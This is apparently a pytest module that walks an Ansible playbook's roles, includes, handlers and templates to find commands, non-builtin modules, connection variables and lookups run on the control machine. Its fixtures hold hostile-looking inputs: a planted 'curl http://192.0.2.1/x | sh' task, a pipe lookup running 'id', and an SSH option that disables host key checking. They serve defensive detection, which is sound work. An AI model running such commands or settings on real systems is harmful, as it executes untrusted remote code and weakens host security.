    if action not in COMMANDS | TASK_INCLUDES and _templated(args.get("_raw_params")):
        raise Unfollowed(f"{said}: {action} given one template as its arguments, which the walk does not read")


def _one_template(text: str, said: str) -> None:
    """Unfollowed where text, a template or a string Ansible renders, names another template (include, import, from
    or extends, which Ansible looks for beside the play or the template), or sets its own delimiters (#jinja2:), under
    which such a statement reads as text."""
    if TEMPLATE_HEADER in text:
        raise Unfollowed(f"{said} that sets its own delimiters ({TEMPLATE_HEADER}), unread by the walk")
    if TEMPLATE_INCLUDE.search(text):
        raise Unfollowed(f"{said} that names another template, unread by the walk")


def walk(play: Path = PLAY, repo: Path = REPO) -> Walk:
    """Everything play reaches, read as the module's docstring says; Unfollowed on a road it does not follow."""
    found = Walk()
    basedir = play.parent
    files: set[tuple[Path, bool, int]] = set()
    roles: set[tuple[str, tuple]] = set()

    def read(path: Path) -> object:
        if not path.is_file():
            raise Unfollowed(f"{path}, which the play reaches, is not a file")
        if not path.resolve().is_relative_to(repo.resolve()):
            raise Unfollowed(f"{_where(path, repo)}: a link out of the checkout, to a file the checkout does not hold")
        if path not in found.files:
            found.files.append(path)
        data = yaml.safe_load(path.read_text())
        # Every string Ansible renders loads a template it names from the play's folder: what that holds is unread.
        for text in _strings(data):
            _one_template(text, f"{_where(path, repo)}: a string")
        return data

    def task_file(path: Path, role: Path | None, handlers: bool, depth: int) -> None:
        # How deep a file is reached decides how Ansible finds what it includes: a role's entry is 0, the play's own
        # tasks 0 and the file it imports 1. A file reached again deeper is walked again, its includes held as there
        # (past 2 nothing changes, so a file that includes itself ends), and its tasks are found once.
        key = (path, handlers, min(depth, 2))
        if key not in files:
            first = not any((path, handlers, each) in files for each in range(3))
            files.add(key)
            task_list(read(path), path, role, handlers, depth, first)

    def task_list(items: object, path: Path, role: Path | None, handlers: bool, depth: int, first: bool) -> None:
        if items is None:
            return
        if not isinstance(items, list) or not all(isinstance(item, dict) for item in items):
            raise Unfollowed(f"{_where(path, repo)}: a list of tasks that is not one")
        for task in items:
            said = f"{_where(path, repo)}: {task.get('name', '')}"
            if first:
                found.entries.append((path, task))
            if "collections" in task:
                raise Unfollowed(f"{said}: a collections keyword, under which a short name can be a collection's")
            _no_defaults(task, f"{said}: a task's or a block's")
            if any(key in task for key in BLOCK):
                for key in BLOCK:
                    task_list(task.get(key), path, role, handlers, depth, first)
                continue
            action, args, _ = _parsed(task)
            _read_whole(action, args, said)
            if action in PLAYBOOK_IMPORTS:
                raise Unfollowed(f"{said}: a playbook imported, which the walk does not follow")
            if handlers and action in TASK_INCLUDES | ROLE_INCLUDES:
                raise Unfollowed(f"{said}: an include in a handler, which Ansible resolves otherwise")
            if action in TASK_INCLUDES | ROLE_INCLUDES and isinstance(args.get("apply"), dict):
                # Ansible loads an include's apply as a block: a block's keywords are held there too.
                if "collections" in args["apply"]:
                    raise Unfollowed(
                        f"{said}: a collections keyword in an include's apply, under which a short name can be a"
                        " collection's"
                    )
                _no_defaults(args["apply"], f"{said}: an include's apply")
            if action in TASK_INCLUDES:
                if role is not None and depth >= 1 and action in IMPORT_TASKS:
                    raise Unfollowed(
                        f"{said}: an import in a file an include brought in, which Ansible looks for under that file's"
                        " own folder's tasks/ and the working folder's before the role's tasks/"
                    )
                if role is None and depth >= 2:
                    raise Unfollowed(
                        f"{said}: an include two files below the play, which Ansible looks for beside the play first"
                    )
                name = _literal(args.get("_raw_params", args.get("file")), f"{said}: {action}")
                where = Path(os.path.normpath((role / "tasks" if role else path.parent) / name))
                task_file(where, role, False, depth + 1)
            elif action in ROLE_INCLUDES:
                froms = {FROM[key]: _literal(args[key], f"{said}: {key}") for key in FROM if key in args}
                role_walk(args.get("name", args.get("role")), froms, said)
            elif action in TEMPLATES:
                source = _literal(args.get("src"), f"{said}: a template's src")
                if role is None:
                    raise Unfollowed(f"{said}: a template outside a role, where the walk reads a role's templates/")
                if Path(source).parts[0] == "templates":
                    raise Unfollowed(f"{said}: {source}, a name under templates/, looked for under the role's first")
                given = [key for key in DELIMITERS if key in args]
                if given:
                    raise Unfollowed(
                        f"{said}: a template's own delimiters ({', '.join(given)}), under which an include the walk"
                        " reads as text names another template"
                    )
                template = role / "templates" / source
                if not template.is_file() or not template.resolve().is_relative_to(role.resolve() / "templates"):
                    raise Unfollowed(f"{said}: the template {source}, not in its role's templates/")
                _one_template(template.read_text(), f"{_where(template, repo)}: a template")
                if template not in found.templates:
                    found.templates.append(template)
            for name in _sent_from_here(action, args, said):
                _role_file(name, role, said)

    def role_entry(entry: object, path: Path, said: str) -> None:
        found.roles.append((path, entry))
        if isinstance(entry, dict) and "collections" in entry:
            raise Unfollowed(f"{said}: a role entry's collections keyword")
        if isinstance(entry, dict):
            _no_defaults(entry, f"{said}: a role entry's")
        role_walk(entry.get("role", entry.get("name")) if isinstance(entry, dict) else entry, {}, said)

    def role_walk(name: object, froms: dict[str, str], said: str) -> None:
        if not isinstance(name, str) or not ROLE_NAME.fullmatch(name):
            raise Unfollowed(f"{said}: the role {name!r}, which is no role of the roles' folder the walk can follow")
        if (name, tuple(sorted(froms.items()))) in roles:
            return
        roles.add((name, tuple(sorted(froms.items()))))
        if (basedir / "roles" / name).exists():
            raise Unfollowed(f"{said}: the role {name}, which the play's own roles/ folder holds, ahead of roles_path")
        root = repo / "roles" / name
        if not root.is_dir():
            raise Unfollowed(f"{said}: the role {name}, which the roles' folder does not hold")
        # A role, or a folder of it Ansible reads, that is a link reads another folder, out of the checkout or into
        # another role's: refused, as a folder link is a road to a file the checkout does not hold.
        if root.resolve() != repo.resolve() / "roles" / name:
            raise Unfollowed(f"{said}: the role {name}, a link to a folder elsewhere")
        for folder in ROLE_FOLDERS:
            if (root / folder).is_symlink():
                raise Unfollowed(f"{_where(root / folder, repo)}: a role's folder that is a link to one elsewhere")
        for folder in sorted(plugin_folders()):
            if os.path.lexists(root / folder):
                raise Unfollowed(f"{_where(root / folder, repo)}: a role's folder Ansible loads code from, run here")
        for path in _role_files(root, "meta", None, allow_dir=False):
            meta = read(path) or {}
            if not isinstance(meta, dict) or "collections" in meta:
                raise Unfollowed(f"{_where(path, repo)}: a role's meta that is no mapping, or a collections keyword")
            for dependency in meta.get("dependencies") or []:
                role_entry(dependency, path, f"{_where(path, repo)}: a dependency")
        # The argument specs, whose strings Ansible templates here as its check's arguments: read for the lookups.
        if any((root / "meta" / f"argument_specs{extension}").exists() for extension in (".yml", ".yaml", ".json")):
            for path in _role_files(root, "meta", "argument_specs", allow_dir=False):
                read(path)
        for folder in ("defaults", "vars"):
            for path in _role_files(root, folder, froms.get(folder), allow_dir=True):
                read(path)
                found.variables.append(path)
        for path in _role_files(root, "tasks", froms.get("tasks"), allow_dir=False):
            task_file(path, root, False, 0)
        for path in _role_files(root, "handlers", froms.get("handlers"), allow_dir=False):
            task_file(path, root, True, 0)

    _beside_the_play(basedir, repo)
    plays = read(play) or []
    if not isinstance(plays, list) or not all(isinstance(each, dict) for each in plays):
        raise Unfollowed(f"{_where(play, repo)}: a playbook that is no list of plays")
    for each in plays:
        said = _where(play, repo)
        if set(each) & PLAYBOOK_IMPORTS:
            raise Unfollowed(f"{said}: a playbook imported, which the walk does not follow")
        if "collections" in each:
            raise Unfollowed(f"{said}: a play's collections keyword, under which a short name can be a collection's")
        _no_defaults(each, f"{said}: the play's")
        found.plays.append((play, each))
        for key in ("pre_tasks", "tasks", "post_tasks"):
            task_list(each.get(key), play, None, False, 0, True)
        task_list(each.get("handlers"), play, None, True, 0, True)
        for name in each.get("vars_files") or []:
            path = basedir / _literal(name, f"{said}: vars_files")
            read(path)
            found.variables.append(path)
        for entry in each.get("roles") or []:
            role_entry(entry, play, f"{said}: roles")
    return found


def _tasks(found: Walk, repo: Path) -> Iterator[tuple[tuple[str, str], str, dict, object]]:
    """Each task the play reaches but a block: its file and name, the module it calls, its arguments and delegation."""
    for path, task in found.entries:
        if not any(key in task for key in BLOCK):
            action, args, delegated = _parsed(task)
            yield (_where(path, repo), task.get("name", "")), action, args, delegated


def _keyed(pairs: Iterable[tuple[tuple[str, str], object]], what: str) -> dict[tuple[str, str], object]:
    """pairs as a dict, Repeated where two share a key: a list held by file and name holds one task under each."""
    keyed: dict[tuple[str, str], object] = {}
    for key, value in pairs:
        if key in keyed:
            raise Repeated(f"two {what} of one file and name, {key}: name them apart, as each is held by its name")
        keyed[key] = value
    return keyed


def commands(play: Path = PLAY, repo: Path = REPO) -> dict[tuple[str, str], tuple[str, dict]]:
    """Each task the play reaches that runs a command, by its file and name: the module it calls and its arguments."""
    found = walk(play, repo)
    pairs = ((key, (action, args)) for key, action, args, _ in _tasks(found, repo) if action in COMMANDS)
    return _keyed(pairs, "commands")


def outside(play: Path = PLAY, repo: Path = REPO) -> dict[tuple[str, str], str]:
    """Each task the play reaches whose action does not resolve within ansible.builtin (not_builtin), by its file and
    name: the module as written, or why a name of ansible.builtin is not built-in."""
    found = walk(play, repo)
    pairs = ((key, said) for key, action, _, _ in _tasks(found, repo) if (said := not_builtin(action)) is not None)
    return _keyed(pairs, "tasks outside ansible.builtin")


def unreasoned(found: dict, reasons: dict) -> list[str]:
    """What found, commands() of a play, does that reasons does not hold: a command with no reason, a reason for a
    command no longer reached, and a command whose module or arguments are not those its reason is held to."""
    said = [f"{key}: a command, shell or raw task REASONS gives no reason" for key in sorted(set(found) - set(reasons))]
    said += [f"{key}: in REASONS, and no longer reached: take it out" for key in sorted(set(reasons) - set(found))]
    said += [
        f"{key}: runs {found[key]!r}, where its reason is held to {tuple(reasons[key][1:])!r}: change both together"
        for key in sorted(set(found) & set(reasons))
        if tuple(found[key]) != tuple(reasons[key][1:])
    ]
    return said


def _templated(name: object) -> bool:
    return isinstance(name, str) and any(opener in name for opener in TEMPLATE)


def _mapping(path: Path, repo: Path) -> dict:
    data = yaml.safe_load(path.read_text()) or {}
    if not isinstance(data, dict):
        raise Unfollowed(f"{_where(path, repo)}: a file of variables that is no mapping")
    return data


def setting_connection_variables(play: Path = PLAY, repo: Path = REPO) -> list[str]:
    """Each place what the play reaches sets a variable whose name begins ansible_, said as the file, where in it, and
    the name; and every include of variables and templated fact's name, whose names the scan cannot read."""
    found = walk(play, repo)
    named: list[tuple[str, object]] = []
    always: list[str] = []
    for path, each in found.plays:
        where = _where(path, repo)
        named += [(f"{where}: the play's vars", name) for name in each.get("vars") or {}]
        prompts = each.get("vars_prompt") or []
        named += [(f"{where}: the play's vars_prompt", p.get("name") if isinstance(p, dict) else p) for p in prompts]
    for path, entry in found.roles:
        if isinstance(entry, dict):
            where = _where(path, repo)
            named += [(f"{where}: a role's params", name) for name in entry if name != "vars"]
            named += [(f"{where}: a role's vars", name) for name in entry.get("vars") or {}]
    for path in found.variables:
        named += [(_where(path, repo), name) for name in _mapping(path, repo)]
    for path, task in found.entries:
        where = f"{_where(path, repo)}: {task.get('name', '')}"
        named += [(where, name) for name in task.get("vars") or {}]
        loop_control = task.get("loop_control") or {}
        named += [(f"{where}: loop_control", loop_control.get(key)) for key in ("loop_var", "index_var")]
        if any(key in task for key in BLOCK):
            continue
        action, args, _ = _parsed(task)
        if action in SET_FACT:
            named += [(where, name) for name in args]
            always += [f"{where}: a fact of a templated name, {name!r}" for name in args if _templated(name)]
        if isinstance(task.get("register"), str):
            named.append((where, task["register"]))
        if action in INCLUDE_VARS:
            always.append(f"{where}: an include of variables, {args!r}")
        if action in ADD_HOST:
            named += [(f"{where}: add_host", name) for name in args]
        if action in TASK_INCLUDES | ROLE_INCLUDES and isinstance(args.get("apply"), dict):
            named += [(f"{where}: its apply's vars", name) for name in args["apply"].get("vars") or {}]
    return [f"{where}: {name}" for where, name in named if str(name).startswith("ansible_")] + always


def _strings(value: object) -> Iterator[str]:
    """Every string of a document read from YAML, its keys among them."""
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for each in (*value.keys(), *value.values()):
            yield from _strings(each)
    elif isinstance(value, list):
        for each in value:
            yield from _strings(each)


def reaching_this_computer(play: Path = PLAY, repo: Path = REPO, lookups: Iterable = LOOKUPS) -> list[str]:
    """Each thing the play reaches that would run or write on this computer, said by its file and where: a delegation,
    a connection keyword, a fetch, a group_by or add_host, a play over any host but all, a with_ loop or a private
    field, a test or a filter that asks this computer of its paths, a lookup in a template, a lookup lookups does not
    list, by its file and whole string; and one lookups lists that is no longer there."""
    from ansible.module_utils.common.sentinel import Sentinel

    found = walk(play, repo)
    said: list[str] = []
    for path, each in found.plays:
        if each.get("hosts") != "all":
            said.append(f"{_where(path, repo)}: a play over {each.get('hosts')!r}, where layer 1's inventory is all")
        said += [f"{_where(path, repo)}: the play's {key}" for key in ELSEWHERE if key in each]
    for path, entry in found.roles:
        if isinstance(entry, dict):
            said += [f"{_where(path, repo)}: a role entry's {key}" for key in ELSEWHERE if key in entry]
    for path, task in found.entries:
        where = f"{_where(path, repo)}: {task.get('name', '')}"
        said += [f"{where}: {key}" for key in ELSEWHERE if key in task]
        said += [f"{where}: {key}, a lookup run here: loop over it instead" for key in task if key.startswith("with_")]
        private = [key for key in task if key in private_fields()]
        said += [
            f"{where}: {key}, a private field of ansible-core's (loop_with runs its lookup here)" for key in private
        ]
        if any(key in task for key in BLOCK):
            continue
        action, args, delegated = _parsed(task)
        if delegated is not Sentinel and not any(key in task for key in ELSEWHERE):
            said.append(f"{where}: delegated to {delegated!r}")
        if action in FETCH:
            said.append(f"{where}: {action}, which writes on this computer")
        if action in GROUPS:
            said.append(f"{where}: {action}, a group joined after the play's check of the connection")
        # Review 67's 8: debug's var and assert's that, evaluated as expressions, in any form the parser takes.
        given = args.get(EXPRESSION_ARGS[action]) if action in EXPRESSION_ARGS else None
        for text in given if isinstance(given, list) else [given]:
            if isinstance(text, str):
                said += [f"{_where(path, repo)}: {each}: {text!r}" for each in _reads_paths(text, True)]
        if action in TASK_INCLUDES | ROLE_INCLUDES and isinstance(args.get("apply"), dict):
            said += [f"{where}: its apply's {key}" for key in ELSEWHERE if key in args["apply"]]
    for path in found.templates:
        if LOOKUP.search(path.read_text()):
            said.append(f"{_where(path, repo)}: a lookup in a template")
        read_here = _reads_paths(path.read_text(), False)
        said += [f"{_where(path, repo)}: {each}" for each in read_here]
    for path in found.files:
        for text, expression in _rendered(yaml.safe_load(path.read_text())):
            read_here = _reads_paths(text, expression)
            said += [f"{_where(path, repo)}: {each}: {text!r}" for each in read_here]
    seen = {
        (_where(path, repo), text)
        for path in found.files
        for text in _strings(yaml.safe_load(path.read_text()))
        if LOOKUP.search(text)
    }
    listed = set(lookups)
    said += [f"{where}: a lookup LOOKUPS does not list, run here: {text!r}" for where, text in sorted(seen - listed)]
    said += [f"{where}: in LOOKUPS, and no longer there: {text!r}" for where, text in sorted(listed - seen)]
    return said


# ---------------------------------------------------------------------------------------------------- the rules ----


def test_every_command_shell_or_raw_the_play_reaches_has_its_reason_held_to_what_it_runs() -> None:
    assert unreasoned(commands(), REASONS) == []
    assert all(reason for reason, _, _ in REASONS.values())


def test_every_module_the_play_reaches_is_ansible_builtin_but_the_three_f6a_replaces() -> None:
    found = outside()
    assert found == {key: module for key, (module, _) in OUTSIDE.items()}, (
        "a module outside ansible.builtin that layer 1 reaches, which a Galaxy collection would have to bring: "
        f"{sorted(set(found.items()) - {(key, module) for key, (module, _) in OUTSIDE.items()})}"
    )
    assert {reason for _, reason in OUTSIDE.values()} == {"replaced by F6a"}


def test_nothing_the_play_reaches_sets_an_ansible_variable() -> None:
    assert setting_connection_variables() == []


def test_nothing_the_play_reaches_runs_or_writes_on_this_computer_but_the_lookups_listed() -> None:
    assert reaching_this_computer() == []
    assert all(LOOKUPS.values())


def test_the_walk_reaches_what_the_play_runs() -> None:
    found = walk()
    files = {_where(path, REPO) for path in found.files}
    # The play, its shared task file, each role's entry point and what it includes, the handlers, the defaults and vars,
    # and each role's argument specs, which the lookups' scan reads.
    assert {
        "playbooks/system.yml",
        "playbooks/tasks/remote_tmp.yml",
        "roles/common/meta/main.yml",
        "roles/common/meta/argument_specs.yml",
        "roles/vscode_server/meta/argument_specs.yml",
        "roles/dev_tools/meta/argument_specs.yml",
        "roles/common/tasks/main.yml",
        "roles/common/tasks/sudo.yml",
        "roles/common/tasks/masked_units.yml",
        "roles/common/handlers/main.yml",
        "roles/vscode_server/tasks/main.yml",
        "roles/vscode_server/handlers/main.yml",
        "roles/dev_tools/tasks/main.yml",
        "roles/dev_tools/tasks/node.yml",
        "roles/dev_tools/tasks/rust.yml",
    } <= files, files
    # Nothing of the roles the play does not run, nor an image's entry point.
    assert not [each for each in files if each.startswith(("roles/claude_code/", "roles/github_projects/"))]
    assert "roles/common/tasks/image.yml" not in files
    # The roles' defaults and internals, whose variables the third rule reads, and the templates the fourth reads.
    assert {_where(path, REPO) for path in found.variables} == {
        "roles/common/defaults/main.yml",
        "roles/common/vars/main.yml",
        "roles/vscode_server/defaults/main.yml",
        "roles/dev_tools/defaults/main.yml",
    }
    assert {path.name for path in found.templates} == {
        "sudoers.j2",
        "local-bin-path.sh.j2",
        "sshd_path.conf.j2",
        "sshd_hardening.conf.j2",
        "20-vscode-server.conf.j2",
        "cargo-bin-path.sh.j2",
    }
    # The three roles, from the play, as their entries.
    roles = [{"role": role, "tags": [role]} for role in ("common", "vscode_server", "dev_tools")]
    assert [entry for _, entry in found.roles] == roles


def test_the_play_s_folder_holds_the_folders_of_plugins_listed_and_no_name_of_ansible_s_own() -> None:
    # Each kind, and each name of Ansible's own, read from Ansible itself: a reading that found none would hold nothing.
    kinds = plugin_folders()
    assert {"library", "module_utils", "action_plugins", "filter_plugins", "vars_plugins", "callback_plugins"} <= kinds
    assert {"setup", "ping", "copy", "normal", "template", "basic", "common"} <= ansibles_own()
    assert set(BESIDE_THE_PLAY) <= kinds and all(BESIDE_THE_PLAY.values())
    # Of what Ansible would take from the play's folder, the three listed alone; the walk holds their names.
    beside = {entry.name for entry in PLAY.parent.iterdir()}
    assert beside & (kinds | {"collections", *HOST_VARIABLES}) == set(BESIDE_THE_PLAY)
    _beside_the_play(PLAY.parent, REPO)


def test_what_the_walk_holds_templates_and_names_to_is_ansible_s_own() -> None:
    from ansible._internal._templating import _jinja_bits

    # The prefix by which a string or a template sets its own delimiters; and of what it can set, what the template
    # action takes from its arguments, but for white space and new lines: the six delimiters, never a line's prefix.
    assert TEMPLATE_HEADER == _jinja_bits.JINJA2_OVERRIDE
    overrides = {field.name for field in dataclasses.fields(_jinja_bits.TemplateOverrides)}
    action = (_ansible() / "plugins" / "action" / "template.py").read_text()
    taken = set(re.findall(r"self\._task\.args\.get\('(\w+)'", action))
    spacing = {"trim_blocks", "lstrip_blocks", "newline_sequence", "keep_trailing_newline"}
    assert taken & (overrides - spacing) == set(DELIMITERS)
    # Review 67's 1, 4 and 11: a task's one private field, which runs a with_ loop's lookup; the files tests, of which
    # abs alone reads no path, and core's vaulted_file beside them; and the path filters, each ansible-core's own.
    from ansible.plugins.filter.core import FilterModule
    from ansible.plugins.test.core import TestModule as CoreTests
    from ansible.plugins.test.files import TestModule

    assert private_fields() == {"loop_with"}
    assert set(TestModule().tests()) - file_tests() == {"abs", "is_abs"}
    assert file_tests() - set(TestModule().tests()) == set(CORE_FILE_TESTS) <= set(CoreTests().tests())
    assert set(PATH_FILTERS) <= set(FilterModule().filters())
    # The routing table, read from the installed package: hundreds of names of ansible.builtin are a collection's.
    away = {name for name, entry in routing()["modules"].items() if not_builtin(f"ansible.builtin.{name}") is not None}
    assert len(away) > 100 and {"synchronize", "patch", "npm", "sysctl", "authorized_key"} <= away
    assert not_builtin("ansible.builtin.copy") is None and not_builtin("ansible.builtin.yum") is None
    # A name it keeps within ansible.builtin comes to none of the names the scans read by name, which they would miss.
    by_name = COMMANDS | SET_FACT | INCLUDE_VARS | ADD_HOST | TASK_INCLUDES | ROLE_INCLUDES | PLAYBOOK_IMPORTS
    by_name = {name.rpartition(".")[2] for name in by_name | TEMPLATES | FETCH | SENT | GROUPS}
    within = [
        (name, str(entry["redirect"]).removeprefix("ansible.builtin."))
        for table in routing().values()
        for name, entry in table.items()
        if str((entry or {}).get("redirect", "")).startswith("ansible.builtin.")
    ]
    assert [pair for pair in within if set(pair) & by_name] == []


# ------------------------------------------------------------------------------- the scans see what they hold ----

# A tree of a test's own: the play, with a shared task file and one role, laid under a test's directory; a road is
# changes laid over it, by each file's path (None takes a file out, a string is a file's text).
BASE: dict[str, object] = {
    "playbooks/system.yml": [
        {
            "name": "p",
            "hosts": "all",
            "pre_tasks": [{"name": "shared tasks", "ansible.builtin.import_tasks": "tasks/shared.yml"}],
            "roles": [{"role": "one", "tags": ["one"]}],
        }
    ],
    "playbooks/tasks/shared.yml": [{"name": "shared", "ansible.builtin.ping": {}}],
    "roles/one/tasks/main.yml": [{"name": "ok", "ansible.builtin.ping": {}}],
    "roles/one/defaults/main.yml": {"one_x": 1},
}
PING = {"name": "t", "ansible.builtin.ping": {}}
# A file of the role's own files/, which a copy of src x sends from this computer.
ROLE_FILE = {"roles/one/files/x": "x\n"}
# A command that runs whatever an address sends, as review 45 planted it.
SHELL = {"name": "c", "ansible.builtin.shell": "curl http://192.0.2.1/x | sh"}
FOUND = ("ansible.builtin.shell", {"_raw_params": "curl http://192.0.2.1/x | sh"})
# A connection variable, and a value of it that would loosen the host key's checking.
NAME, LOOSE = "ansible_ssh_common_args", "-o StrictHostKeyChecking=no"
# A lookup run here, and a role's template task that renders x.j2.
PIPE = "{{ lookup('ansible.builtin.pipe', 'id') }}"
TEMPLATE_ARGS = {"src": "x.j2", "dest": "/x"}
TEMPLATE_TASK = {"name": "t", "ansible.builtin.template": TEMPLATE_ARGS}
# Delimiters of a template's own, as the template action takes them and a #jinja2: line sets them.
SQUARE = {"block_start_string": "[%", "block_end_string": "%]"}
HEADER = "#jinja2: block_start_string:'[%', block_end_string:'%]'\n"
# A copy with no src of its own, and the src a module_defaults would give it: a file of this computer.
UNSOURCED = {"name": "c", "ansible.builtin.copy": {"dest": "/y"}}
SECRET_SRC = {"src": "/etc/hostname"}
# A collection a collections keyword names.
ZR = ["zr.c"]


def _with(**keys: object) -> list:
    """BASE's play with keys of its own."""
    return [{**BASE["playbooks/system.yml"][0], **keys}]  # type: ignore[index]


def _planted(root: Path, changes: dict[str, object]) -> Path:
    """BASE with changes laid over it, written under root: the play's path."""
    for name, data in {**BASE, **changes}.items():
        if data is not None:
            path = root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(data if isinstance(data, str) else yaml.safe_dump(data))
    return root / "playbooks" / "system.yml"


def _in_one(*tasks: dict) -> dict[str, object]:
    """The role's tasks/main.yml holding tasks."""
    return {"roles/one/tasks/main.yml": list(tasks)}


def _role_two(**tasks_from: list) -> dict[str, object]:
    """A second role, two, with a shell in its tasks/main.yml, or in tasks/<name>.yml for each name given."""
    return {f"roles/two/tasks/{name}.yml": listed for name, listed in ({"main": [SHELL]} | tasks_from).items()}


# Each road to a command, and the file the command is found in: the review's roads (a role a meta/main.yml names among
# its dependencies, a role included or imported from a role's own tasks), and the spellings and files Ansible takes.
COMMAND_ROADS: dict[str, tuple[dict[str, object], str]] = {
    "a role under meta dependencies": (
        {"roles/one/meta/main.yml": {"dependencies": ["two"]}, **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "a role a meta dependency names by its role key": (
        {"roles/one/meta/main.yml": {"dependencies": [{"role": "two"}]}, **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "include_role from a role's tasks": (
        {**_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two"}}), **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "import_role from a role's tasks": (
        {**_in_one({"name": "i", "ansible.builtin.import_role": {"name": "two"}}), **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "a short include_role by its role key": (
        {**_in_one({"name": "i", "include_role": {"role": "two"}}), **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "a role's tasks_from": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two", "tasks_from": "other"}}),
            **_role_two(other=[SHELL]),
        },
        "roles/two/tasks/other.yml",
    ),
    "a role's handlers_from": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two", "handlers_from": "other"}}),
            "roles/two/handlers/other.yml": [SHELL],
        },
        "roles/two/handlers/other.yml",
    ),
    "a short include_tasks in a role": (
        {**_in_one({"name": "i", "include_tasks": "more.yml"}), "roles/one/tasks/more.yml": [SHELL]},
        "roles/one/tasks/more.yml",
    ),
    "an ansible.legacy import_tasks in a role": (
        {**_in_one({"name": "i", "ansible.legacy.import_tasks": "more.yml"}), "roles/one/tasks/more.yml": [SHELL]},
        "roles/one/tasks/more.yml",
    ),
    "an include given as a file in a role": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_tasks": {"file": "more.yml"}}),
            "roles/one/tasks/more.yml": [SHELL],
        },
        "roles/one/tasks/more.yml",
    ),
    "a role's tasks in main.yaml": (
        {"roles/one/tasks/main.yml": None, "roles/one/tasks/main.yaml": [SHELL]},
        "roles/one/tasks/main.yaml",
    ),
    "a role's handlers in main.json": ({"roles/one/handlers/main.json": [SHELL]}, "roles/one/handlers/main.json"),
    "a role's handlers": ({"roles/one/handlers/main.yml": [SHELL]}, "roles/one/handlers/main.yml"),
    "include_role from the play": (
        {
            "playbooks/system.yml": _with(
                tasks=[{"name": "i", "ansible.builtin.include_role": {"name": "two", "tasks_from": "other"}}]
            ),
            **_role_two(other=[SHELL]),
        },
        "roles/two/tasks/other.yml",
    ),
    "the play's post_tasks": ({"playbooks/system.yml": _with(post_tasks=[SHELL])}, "playbooks/system.yml"),
    "the play's handlers": ({"playbooks/system.yml": _with(handlers=[SHELL])}, "playbooks/system.yml"),
    "an include in a play's shared file": (
        {
            "playbooks/tasks/shared.yml": [{"name": "i", "include_tasks": "deeper.yml"}],
            "playbooks/tasks/deeper.yml": [SHELL],
        },
        "playbooks/tasks/deeper.yml",
    ),
    "an include in a file a role's include brought in": (
        {
            **_in_one({"name": "i", "include_tasks": "inner.yml"}),
            "roles/one/tasks/inner.yml": [{"name": "j", "ansible.builtin.include_tasks": "more.yml"}],
            "roles/one/tasks/more.yml": [SHELL],
        },
        "roles/one/tasks/more.yml",
    ),
    "a role's file that includes itself": (
        {
            **_in_one({"name": "i", "include_tasks": "more.yml"}),
            "roles/one/tasks/more.yml": [{"name": "again", "include_tasks": "more.yml", "when": "x"}, SHELL],
        },
        "roles/one/tasks/more.yml",
    ),
}


@pytest.mark.parametrize("road", sorted(COMMAND_ROADS))
def test_a_command_on_every_road_the_play_has_to_a_task_is_found(tmp_path: Path, road: str) -> None:
    changes, where = COMMAND_ROADS[road]
    play = _planted(tmp_path, changes)
    assert commands(play, tmp_path) == {(where, "c"): FOUND}
    assert unreasoned(commands(play, tmp_path), {}) == [
        f"{(where, 'c')}: a command, shell or raw task REASONS gives no reason"
    ]


@pytest.mark.parametrize(
    ("task", "module"),
    [
        ({"name": "c", "ansible.builtin.command": {"argv": ["true"]}}, "ansible.builtin.command"),
        ({"name": "c", "command": "true"}, "command"),
        ({"name": "c", "ansible.legacy.shell": "true"}, "ansible.legacy.shell"),
        ({"name": "c", "ansible.builtin.raw": "true"}, "ansible.builtin.raw"),
        ({"name": "c", "ansible.builtin.script": "x.sh"}, "ansible.builtin.script"),
        ({"name": "c", "action": "ansible.builtin.shell true"}, "ansible.builtin.shell"),
        ({"name": "c", "ansible.builtin.expect": {"command": "true", "responses": {}}}, "ansible.builtin.expect"),
    ],
    ids=["command", "short", "legacy shell", "raw", "script", "action", "expect"],
)
def test_a_command_anywhere_the_play_reaches_is_found(tmp_path: Path, task: dict, module: str) -> None:
    # In a block's rescue, in a task file the role's entry point includes, with a loop and a condition.
    nested = {"name": "b", "block": [{"name": "ok", "ansible.builtin.ping": {}}], "rescue": [{**task, "loop": [1]}]}
    changes = {
        **_in_one({"name": "inc", "ansible.builtin.include_tasks": "deep.yml", "when": "x"}),
        "roles/one/tasks/deep.yml": [nested],
    }
    found = commands(_planted(tmp_path, changes), tmp_path)
    assert list(found) == [("roles/one/tasks/deep.yml", "c")] and found[("roles/one/tasks/deep.yml", "c")][0] == module


def test_a_module_outside_ansible_builtin_is_found_by_any_spelling(tmp_path: Path) -> None:
    changes = (
        _in_one(
            {"name": "a", "community.general.npm": {"name": "x"}},
            {"name": "b", "ansible.legacy.copy": {"src": "x", "dest": "y"}},
            {"name": "c", "copy": {"src": "x", "dest": "y"}},
            {"name": "d", "ansible.builtin.copy": {"src": "x", "dest": "y"}},
            # Review 61's 2: names of ansible.builtin that ansible-core routes to a collection, or has removed, or
            # that name nothing of its own; and one it routes within ansible.builtin (yum's action is dnf's).
            {"name": "e", "ansible.builtin.synchronize": {"src": "/home", "dest": "/tmp/x"}},
            {"name": "f", "ansible.builtin.patch": {"src": "x.patch", "dest": "/x"}},
            {"name": "g", "ansible.builtin.npm": {"name": "x"}},
            {"name": "h", "ansible.builtin.bigip_facts": {}},
            {"name": "i", "ansible.builtin.made_up": {}},
            {"name": "j", "ansible.builtin.yum": {"name": "x"}},
        )
        | ROLE_FILE
    )
    assert outside(_planted(tmp_path, changes), tmp_path) == {
        ("roles/one/tasks/main.yml", "a"): "community.general.npm",
        ("roles/one/tasks/main.yml", "b"): "ansible.legacy.copy",
        ("roles/one/tasks/main.yml", "c"): "copy",
        ("roles/one/tasks/main.yml", "e"): "ansible.builtin.synchronize, which ansible-core routes to"
        " ansible.posix.synchronize",
        ("roles/one/tasks/main.yml", "f"): "ansible.builtin.patch, which ansible-core routes to ansible.posix.patch",
        ("roles/one/tasks/main.yml", "g"): "ansible.builtin.npm, which ansible-core routes to community.general.npm",
        ("roles/one/tasks/main.yml", "h"): "ansible.builtin.bigip_facts, which ansible-core has removed",
